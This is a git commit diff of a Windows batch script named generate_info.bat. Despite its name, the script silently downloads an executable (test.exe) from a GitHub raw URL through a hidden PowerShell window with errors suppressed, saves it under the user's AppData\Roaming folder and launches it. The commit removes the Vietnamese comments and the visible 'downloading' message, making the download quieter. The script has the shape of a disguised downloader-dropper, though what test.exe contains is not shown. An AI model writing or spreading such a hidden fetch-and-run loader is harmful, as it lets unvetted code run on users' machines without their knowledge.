1992af9ac73b06b017a0a5d1b6d801faaee74dab
rspvn <rspvn0@gmail.com>
2024-08-08 10:45:35 +0700

    Update generate_info.bat

--- generate_info.bat
+++ generate_info.bat
@@ -1,31 +1,39 @@
 @echo off
 setlocal
 
+
 set "file=test.exe"
 set "url=https://github.com/rspvn/a/raw/main/test.exe"
 set "folder=%USERPROFILE%\AppData\Roaming\test"
 
-:: Tạo thư mục nếu chưa tồn tại
+
 if not exist "%folder%" (
     mkdir "%folder%"
 )
 
-:: Kiểm tra nếu tệp đã tồn tại và khởi chạy
+:: Check if file exists
 if exist "%folder%\%file%" (
+    
     start "" "%folder%\%file%"
     exit /b
 ) else (
-    echo Đang tải tệp...
+    
     powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%folder%\%file%' -ErrorAction SilentlyContinue"
 
-    :: Kiểm tra xem tệp đã tải xong chưa
+    
     if exist "%folder%\%file%" (
+        
+
+        
         start "" "%folder%\%file%"
+
+        
+       
     ) else (
-        echo Tải tệp thất bại.
+        echo Download failed.
     )
     
-    :: Đóng cửa sổ CMD sau 5 giây
+    :: Close CMD window after 5 seconds
     timeout /t 5 /nobreak >nul
     exit /b
 )
